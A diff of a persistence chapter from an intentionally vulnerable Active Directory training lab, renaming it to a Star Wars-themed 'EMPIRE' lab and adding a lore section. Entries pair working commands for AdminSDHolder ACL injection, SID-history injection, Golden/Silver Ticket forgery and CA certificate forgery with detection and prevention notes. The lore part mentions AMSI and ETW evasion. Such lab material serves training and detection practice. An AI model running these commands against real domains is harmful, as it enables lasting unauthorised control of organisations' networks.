@@ -1,6 +1,6 @@
 # 06 — Persistence (PER-001..037)
 
-Persistence = "stay after credentials change, after reboot, after the IR team thinking they've cleaned up." DVAD has every common Windows + AD persistence primitive wired up — the lab is for *practicing detection* as much as offense.
+Persistence = "stay after credentials change, after reboot, after the IR team thinking they've cleaned up." EMPIRE has every common Windows + AD persistence primitive wired up — the lab is for *practicing detection* as much as offense.
 
 ---
 
@@ -141,12 +141,12 @@ See CRED-043.
 ---
 
 ### PER-015 — AdminSDHolder ACL injection
-**What it is:** add ACE to `CN=AdminSDHolder,CN=System,DC=corp,DC=local`. SDProp re-applies the AdminSDHolder ACL every 60 minutes to every protected object (Domain Admins, Enterprise Admins, etc.). Self-healing backdoor — even if removed, returns within the hour.
-**Why it works here:** GenericAll injected for `steve.rogers` in DVAD.
+**What it is:** add ACE to `CN=AdminSDHolder,CN=System,DC=empire,DC=local`. SDProp re-applies the AdminSDHolder ACL every 60 minutes to every protected object (Domain Admins, Enterprise Admins, etc.). Self-healing backdoor — even if removed, returns within the hour.
+**Why it works here:** GenericAll injected for `steve.rogers` in EMPIRE.
 **Tools:** PowerView `Add-DomainObjectAcl -TargetIdentity AdminSDHolder -PrincipalIdentity steve.rogers -Rights All`.
 **Steps:**
 ```powershell
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=empire,DC=local' \
    -PrincipalIdentity steve.rogers -Rights All
 ```
 **Detection:** Event `5136` on AdminSDHolder; MDI native alert.
@@ -159,7 +159,7 @@ Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local
 **Tools:** mimikatz `sid::patch` + `sid::add`, DCShadow.
 **Steps:**
 ```powershell
-.\mimikatz.exe "sid::patch" "sid::add /sam:loki /new:S-1-5-21-CORP-519"
+.\mimikatz.exe "sid::patch" "sid::add /sam:loki /new:S-1-5-21-EMPIRE-519"
 ```
 **Detection:** MDI "SID-History suspicious activity."
 **Prevention:** Quarantine attribute; PowerShell `Get-ADUser -Filter * -Properties sIDHistory | ?{$_.sIDHistory}` audit; SIDHistory should be empty in modern domains.
@@ -173,14 +173,14 @@ See CRED-015.
 
 ### PER-018 — Golden Ticket
 **What it is:** forge a TGT with the krbtgt NT hash. Lasts until krbtgt is reset *twice*.
-**Why it works here:** krbtgt set deterministically to `KrbtgtDVAD2024!`.
+**Why it works here:** krbtgt set deterministically to `KrbtgtEmpire2024!`.
 **Tools:** `mimikatz kerberos::golden`, `impacket-ticketer`.
 **Steps:**
 ```powershell
-.\mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-... /user:Administrator /krbtgt:HASH /ptt"
+.\mimikatz.exe "kerberos::golden /domain:empire.local /sid:S-1-5-21-... /user:Administrator /krbtgt:HASH /ptt"
 ```
 ```bash
-impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local Administrator
+impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain empire.local Administrator
 ```
 **Detection:** Event `4769` TGS with no preceding `4768` (TGT issued); abnormal account-creation time in PAC; MDI "Suspected Golden Ticket usage."
 **Prevention:** **rotate krbtgt twice** with the official script after compromise; tier-0 hygiene.
@@ -192,7 +192,7 @@ impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.loca
 **Tools:** `mimikatz`, `ticketer.py`.
 **Steps:**
 ```bash
-impacket-ticketer -nthash HASH -domain corp.local -spn cifs/file01.corp.local -domain-sid S-1-5-21-... Administrator
+impacket-ticketer -nthash HASH -domain empire.local -spn cifs/scarif.empire.local -domain-sid S-1-5-21-... Administrator
 ```
 **Detection:** Event `4624` Logon Type 3 to service with mismatched PAC; service-side ticket inspection.
 **Prevention:** AES-only; service-account password rotation; PAC validation.
@@ -231,8 +231,8 @@ impacket-ticketer -nthash HASH -domain corp.local -spn cifs/file01.corp.local -d
 **Tools:** `Certipy ca -backup`, `ForgeCert.exe`.
 **Steps:**
 ```bash
-certipy ca -u Administrator -p 'DVADlab2024!' -ca corp-CA-CA -backup
-ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword '' --Subject 'CN=Administrator' --SubjectAltName 'Administrator@corp.local' --NewCertPath admin.pfx --NewCertPassword ''
+certipy ca -u Administrator -p 'EmpireLab2024!' -ca corp-CA-CA -backup
+ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword '' --Subject 'CN=Administrator' --SubjectAltName 'Administrator@empire.local' --NewCertPath admin.pfx --NewCertPassword ''
 certipy auth -pfx admin.pfx -dc-ip 10.10.0.10
 ```
 **Detection:** unusual `certutil -backupkey`/CA backup; private key export events (Event `70` on CA).
@@ -267,7 +267,7 @@ See PER-009 / CRED-038.
 **Tools:** `pyWhisker`, `Certipy shadow`.
 **Steps:**
 ```bash
-certipy shadow auto -u peter.parker -p 'DVADlab2024!' -account peter.parker
+certipy shadow auto -u peter.parker -p 'EmpireLab2024!' -account peter.parker
 ```
 **Detection:** Event `5136` on `msDS-KeyCredentialLink` (self).
 **Prevention:** restrict self-write on `msDS-KeyCredentialLink`; KB5014754 strict mapping.
@@ -289,7 +289,7 @@ certipy shadow auto -u peter.parker -p 'DVADlab2024!' -account peter.parker
 ---
 
 ### PER-030 — ADIDNS Time Bomb
-**What it is:** pre-register DNS names you predict will exist later (`new-fileserver.corp.local`) → first-auth MITM.
+**What it is:** pre-register DNS names you predict will exist later (`new-fileserver.empire.local`) → first-auth MITM.
 **Detection:** ADIDNS write monitoring.
 **Prevention:** restrict ADIDNS create.
 
@@ -349,3 +349,85 @@ See PER-015.
 ---
 
 Next: [`07-forest-compromise.md`](07-forest-compromise.md).
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
